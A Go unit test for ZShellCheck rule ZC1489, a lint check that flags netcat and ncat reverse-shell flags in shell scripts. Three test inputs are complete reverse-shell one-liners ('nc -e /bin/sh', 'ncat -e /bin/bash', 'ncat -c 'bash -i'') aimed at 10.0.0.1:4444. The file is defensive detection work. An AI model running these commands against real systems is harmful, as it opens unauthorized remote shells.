// SPDX-License-Identifier: MIT
// Copyright the ZShellCheck contributors.
package katas

import (
	"testing"

	"github.com/afadesigns/zshellcheck/pkg/katas"
	"github.com/afadesigns/zshellcheck/pkg/testutil"
)

func TestZC1489(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — nc -l 4444",
			input:    `nc -l 4444`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — nc host 443",
			input:    `nc example.com 443`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — nc -e /bin/sh",
			input: `nc -e /bin/sh 10.0.0.1 4444`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1489",
					Message: "`nc -e` is the classic reverse-shell flag. Use socat with explicit PTY + authorization instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — ncat -e /bin/bash",
			input: `ncat -e /bin/bash 10.0.0.1 4444`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1489",
					Message: "`ncat -e` is the classic reverse-shell flag. Use socat with explicit PTY + authorization instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — ncat -c 'bash -i'",
			input: `ncat -c 'bash -i' 10.0.0.1 4444`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1489",
					Message: "`ncat -c` is the classic reverse-shell flag. Use socat with explicit PTY + authorization instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1489")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}
